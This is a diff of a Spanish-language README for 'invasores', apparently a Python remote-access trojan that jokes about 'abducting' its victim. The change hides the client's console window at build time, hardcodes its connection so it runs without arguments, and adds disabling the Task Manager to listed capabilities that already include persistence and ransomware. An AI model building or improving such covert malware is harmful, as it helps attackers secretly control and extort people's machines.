@@ -30,25 +30,25 @@ python3 invasores.py
 La curiosa persona se acerca a tu nave, pero todavía no sabe que le espera...
 
 ```
-python3 client.py <ip> <port>
+python3 client.py
 ```
 
 También puedes crear el ejecutable del mismo, haciendo lo siguiente:
 
 ```
-pyinstaller --onefile client.py
+pyinstaller --noconsole --onefile client.py
 ```
 
 Luego de esto, podrás ejecutarlo de la siguiente manera:
 
 ```
-./client <ip> <port>
+./client
 ```
 
 ó
 
 ```
-client.exe <ip> <port>
+client.exe 
 ```
 
 ## Que se puede hacer con invasores? ##
@@ -67,6 +67,7 @@ Cuando hayamos raptado al individuo, podremos hacer diferentes cosas:
 - Screenshot (en desarrollo)
 - Persistencia
 - Autoremoverse (en desarrollo)
+- Deshabilitar administrador de tareas
 - Ransomware (en desarrollo)
 
 
